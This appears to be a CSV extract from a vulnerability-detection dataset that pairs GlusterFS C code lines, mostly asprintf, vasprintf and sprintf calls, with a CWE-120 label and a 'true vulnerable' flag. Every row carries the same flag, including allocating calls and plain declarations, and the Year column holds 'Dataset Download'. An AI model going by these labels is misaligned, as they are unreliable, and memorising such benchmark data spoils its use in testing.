GithubID,Year,FullPath,Codesnippet,CWE,isTrueVulnerable,Codesnippet5
2021\cslim\test\libglusterfs\common-utils.cpp.c,Dataset Download,../../Dataset Download/2021\cslim\test\libglusterfs\common-utils.cpp.c,"ret = gf_asprintf (&str, ""%.1lfGB"", ((double) n)/1073741824ULL);",120,1,"                        goto err;
        } else if (n >= 1073741824ULL) {
                ret = gf_asprintf (&str, ""%.1lfGB"", ((double) n)/1073741824ULL);
                if (ret < 0)
                        goto err;
"
2021\cslim\test\libglusterfs\common-utils.cpp.c,Dataset Download,../../Dataset Download/2021\cslim\test\libglusterfs\common-utils.cpp.c,"ret = gf_asprintf (&str, ""%.1lfMB"", ((double) n)/1048576ULL);",120,1,"                        goto err;
        } else if (n >= 1048576ULL) {
                ret = gf_asprintf (&str, ""%.1lfMB"", ((double) n)/1048576ULL);
                if (ret < 0)
                        goto err;
"
2021\cslim\test\libglusterfs\common-utils.cpp.c,Dataset Download,../../Dataset Download/2021\cslim\test\libglusterfs\common-utils.cpp.c,"ret = gf_asprintf (&str, ""%.1lfKB"", ((double) n)/1024ULL);",120,1,"                        goto err;
        } else if (n >= 1024ULL) {
                ret = gf_asprintf (&str, ""%.1lfKB"", ((double) n)/1024ULL);
                if (ret < 0)
                        goto err;
"
2021\cslim\test\libglusterfs\common-utils.cpp.c,Dataset Download,../../Dataset Download/2021\cslim\test\libglusterfs\common-utils.cpp.c,"ret = gf_asprintf (&str, ""%luBytes"", n);",120,1,"                        goto err;
        } else {
                ret = gf_asprintf (&str, ""%luBytes"", n);
                if (ret < 0)
                        goto err;
"
2021\cslim\test\libglusterfs\common-utils.cpp.c,Dataset Download,../../Dataset Download/2021\cslim\test\libglusterfs\common-utils.cpp.c,"ret = gf_asprintf (&cmd_args->log_file,",120,1,"                }

                ret = gf_asprintf (&cmd_args->log_file,
                                   DATADIR ""/log/glusterfs"" ""/%s.log"",
                                   tmp_str);
"
2021\cslim\test\libglusterfs\common-utils.cpp.c,Dataset Download,../../Dataset Download/2021\cslim\test\libglusterfs\common-utils.cpp.c,"ret = gf_asprintf (&cmd_args->log_ident, ""%s"", ptr + 1);",120,1,"
        if (((void *)0) != (ptr = strrchr (cmd_args->log_file, '/'))) {
                ret = gf_asprintf (&cmd_args->log_ident, ""%s"", ptr + 1);
        } else {
                ret = gf_asprintf (&cmd_args->log_ident, ""%s"",
"
2021\cslim\test\libglusterfs\common-utils.cpp.c,Dataset Download,../../Dataset Download/2021\cslim\test\libglusterfs\common-utils.cpp.c,"ret = gf_asprintf (&cmd_args->log_ident, ""%s"",",120,1,"                ret = gf_asprintf (&cmd_args->log_ident, ""%s"", ptr + 1);
        } else {
                ret = gf_asprintf (&cmd_args->log_ident, ""%s"",
                                   cmd_args->log_file);
        }
"
2021\cslim\test\libglusterfs\compat.c,Dataset Download,../../Dataset Download/2021\cslim\test\libglusterfs\compat.c,"ret = gf_asprintf (&key, ""ref:%p"", value);",120,1,"
        if (!key) {
                ret = gf_asprintf (&key, ""ref:%p"", value);
                if (-1 == ret) {
                        return -1;
"
2021\cslim\test\libglusterfs\compat.c,Dataset Download,../../Dataset Download/2021\cslim\test\libglusterfs\compat.c,"ret = gf_asprintf (&data->data, ""%d"", value);",120,1,"                return ((void *)0);
        }
        ret = gf_asprintf (&data->data, ""%d"", value);
        if (-1 == ret) {
                do { _gf_msg (""dict"", ""./dict.c"", __FUNCTION__, 745, GF_LOG_DEBUG, 0, 0, 0, ""asprintf failed""); } while (0);
"
2021\cslim\test\libglusterfs\compat.c,Dataset Download,../../Dataset Download/2021\cslim\test\libglusterfs\compat.c,"ret = gf_asprintf (&data->data, ""%""""d"", value);",120,1,"                return ((void *)0);
        }
        ret = gf_asprintf (&data->data, ""%""""d"", value);
        if (-1 == ret) {
                do { _gf_msg (""dict"", ""./dict.c"", __FUNCTION__, 725, GF_LOG_DEBUG, 0, 0, 0, ""asprintf failed""); } while (0);
"
2021\cslim\test\libglusterfs\compat.c,Dataset Download,../../Dataset Download/2021\cslim\test\libglusterfs\compat.c,"ret = gf_asprintf (&data->data, ""%""""l"" ""d"", value);",120,1,"                return ((void *)0);
        }
        ret = gf_asprintf (&data->data, ""%""""l"" ""d"", value);
        if (-1 == ret) {
                do { _gf_msg (""dict"", ""./dict.c"", __FUNCTION__, 686, GF_LOG_DEBUG, 0, 0, 0, ""asprintf failed""); } while (0);
"
2021\cslim\test\libglusterfs\compat.c,Dataset Download,../../Dataset Download/2021\cslim\test\libglusterfs\compat.c,"ret = gf_asprintf (&data->data, ""%""""u"", value);",120,1,"                return ((void *)0);
        }
        ret = gf_asprintf (&data->data, ""%""""u"", value);
        if (-1 == ret) {
                return ((void *)0);
"
2021\cslim\test\libglusterfs\compat.c,Dataset Download,../../Dataset Download/2021\cslim\test\libglusterfs\compat.c,"ret = gf_asprintf (&data->data, ""%""""l"" ""u"", value);",120,1,"                return ((void *)0);
        }
        ret = gf_asprintf (&data->data, ""%""""l"" ""u"", value);
        if (-1 == ret) {
                do { _gf_msg (""dict"", ""./dict.c"", __FUNCTION__, 765, GF_LOG_DEBUG, 0, 0, 0, ""asprintf failed""); } while (0);
"
2021\cslim\test\libglusterfs\compat.c,Dataset Download,../../Dataset Download/2021\cslim\test\libglusterfs\compat.c,"ret = gf_asprintf (&data->data, ""%f"", value);",120,1,"        }

        ret = gf_asprintf (&data->data, ""%f"", value);
        if (ret == -1) {
                return ((void *)0);
"
2021\cslim\test\libglusterfs\compat.c,Dataset Download,../../Dataset Download/2021\cslim\test\libglusterfs\compat.c,"gf_asprintf (char **string_ptr, const char *format, ...)",120,1,"} __pthread_unwind_buf_t __attribute__ ((__aligned__));

gf_asprintf (char **string_ptr, const char *format, ...)
{
        va_list arg;
"
2021\cslim\test\libglusterfs\compat.c,Dataset Download,../../Dataset Download/2021\cslim\test\libglusterfs\compat.c,"rv = gf_vasprintf (string_ptr, format, arg);",120,1,"
        __builtin_va_start(arg,format);
        rv = gf_vasprintf (string_ptr, format, arg);
        __builtin_va_end(arg);

"
2021\cslim\test\libglusterfs\compat.c,Dataset Download,../../Dataset Download/2021\cslim\test\libglusterfs\compat.c,"gf_vasprintf (char **string_ptr, const char *format, va_list arg)",120,1,"};

gf_vasprintf (char **string_ptr, const char *format, va_list arg)
{
        va_list arg_save;
"
2021\cslim\test\libglusterfs\compat.c,Dataset Download,../../Dataset Download/2021\cslim\test\libglusterfs\compat.c,"size = vasprintf (&str, fmt, ap);",120,1,"        int size = 0;

        size = vasprintf (&str, fmt, ap);

        if (size < 0)
"
2021\cslim\test\libglusterfs\compat.c,Dataset Download,../../Dataset Download/2021\cslim\test\libglusterfs\compat.c,"extern int vasprintf (char **__restrict __ptr, const char *__restrict __f,",120,1,"}

extern int vasprintf (char **__restrict __ptr, const char *__restrict __f,
        __gnuc_va_list __arg)
     __attribute__ ((__nothrow__)) __attribute__ ((__format__ (__printf__, 2, 0))) ;
"
2021\cslim\test\libglusterfs\compat.c,Dataset Download,../../Dataset Download/2021\cslim\test\libglusterfs\compat.c,"extern int __asprintf (char **__restrict __ptr,",120,1,"        __gnuc_va_list __arg)
     __attribute__ ((__nothrow__)) __attribute__ ((__format__ (__printf__, 2, 0))) ;
extern int __asprintf (char **__restrict __ptr,
         const char *__restrict __fmt, ...)
     __attribute__ ((__nothrow__)) __attribute__ ((__format__ (__printf__, 2, 3))) ;
"
2021\cslim\test\libglusterfs\compat.c,Dataset Download,../../Dataset Download/2021\cslim\test\libglusterfs\compat.c,"extern int asprintf (char **__restrict __ptr,",120,1,"         const char *__restrict __fmt, ...)
     __attribute__ ((__nothrow__)) __attribute__ ((__format__ (__printf__, 2, 3))) ;
extern int asprintf (char **__restrict __ptr,
       const char *__restrict __fmt, ...)
     __attribute__ ((__nothrow__)) __attribute__ ((__format__ (__printf__, 2, 3))) ;
"
2021\cslim\test\libglusterfs\compat.h,Dataset Download,../../Dataset Download/2021\cslim\test\libglusterfs\compat.h,"extern int vasprintf (char **__restrict __ptr, const char *__restrict __f,;",120,1,"extern char *strncpy (char *__restrict __dest,;
strfd_close (strfd_t *strfd);
extern int vasprintf (char **__restrict __ptr, const char *__restrict __f,;
gf_roundup_next_power_of_two (int32_t nr);
__gf_realloc (void *ptr, size_t size);
"
2021\cslim\test\libglusterfs\graph-print.cpp.c,Dataset Download,../../Dataset Download/2021\cslim\test\libglusterfs\graph-print.cpp.c,"ret = gf_vasprintf (&str, format, arg);",120,1,"
        __builtin_va_start(arg,format);
        ret = gf_vasprintf (&str, format, arg);
        __builtin_va_end(arg);

"
2021\cslim\test\libglusterfs\graph.cpp.c,Dataset Download,../../Dataset Download/2021\cslim\test\libglusterfs\graph.cpp.c,"sprintf(strpos, ""%d"", pos);",120,1,"                if (pos < 0)
                        goto out;
                sprintf(strpos, ""%d"", pos);

                err = dict_set_static_ptr(leaves, strpos, base);
"
2021\cslim\test\libglusterfs\inode.cpp.c,Dataset Download,../../Dataset Download/2021\cslim\test\libglusterfs\inode.cpp.c,"ret = gf_asprintf (&new->name, ""%s/inode"", xl->name);",120,1,"        do { (&new->purge)->next = (&new->purge)->prev = &new->purge; } while (0);

        ret = gf_asprintf (&new->name, ""%s/inode"", xl->name);
        if (-1 == ret) {

"
2021\cslim\test\libglusterfs\logging.cpp.c,Dataset Download,../../Dataset Download/2021\cslim\test\libglusterfs\logging.cpp.c,"if (vasprintf (&msg, format, ap) != -1) {",120,1,"
        __builtin_va_start(ap,format);
        if (vasprintf (&msg, format, ap) != -1) {
                p = _json_escape (msg, json_msg, 8192);
                syslog (facility_priority, ""%s"", msg);
"
2021\cslim\test\libglusterfs\logging.cpp.c,Dataset Download,../../Dataset Download/2021\cslim\test\libglusterfs\logging.cpp.c,"syslog (GF_LOG_CRITICAL, ""vasprintf() failed, out of memory?"");",120,1,"                free (msg);
        } else
                syslog (GF_LOG_CRITICAL, ""vasprintf() failed, out of memory?"");
        __builtin_va_end(ap);
}
"
2021\cslim\test\libglusterfs\logging.cpp.c,Dataset Download,../../Dataset Download/2021\cslim\test\libglusterfs\logging.cpp.c,"vasprintf (&str2, fmt, ap);",120,1,"
                __builtin_va_start(ap,fmt);
                vasprintf (&str2, fmt, ap);
                __builtin_va_end(ap);

"
2021\cslim\test\libglusterfs\logging.cpp.c,Dataset Download,../../Dataset Download/2021\cslim\test\libglusterfs\logging.cpp.c,"ret = gf_asprintf (&str1, ""[%s] %s [%s:%d:%s] %s %d-%s: "",",120,1,"                  "".%""""06ld"", tv.tv_usec);

        ret = gf_asprintf (&str1, ""[%s] %s [%s:%d:%s] %s %d-%s: "",
                           timestr, level_strings[level],
                           basename, line, function, callstr,
"
2021\cslim\test\libglusterfs\logging.cpp.c,Dataset Download,../../Dataset Download/2021\cslim\test\libglusterfs\logging.cpp.c,"ret = vasprintf (&str2, fmt, ap);",120,1,"        }

        ret = vasprintf (&str2, fmt, ap);
        if (-1 == ret) {
                goto out;
"
2021\cslim\test\libglusterfs\logging.cpp.c,Dataset Download,../../Dataset Download/2021\cslim\test\libglusterfs\logging.cpp.c,"ret = gf_asprintf (&header, ""[%s] %s [%s:%d:%s]""",120,1,"        if (fmt == gf_logformat_traditional) {
                if (!callstr) {
                        ret = gf_asprintf (&header, ""[%s] %s [%s:%d:%s]""
                                                    "" %d-%s: "",
                                           timestr, gf_level_strings[level],
"
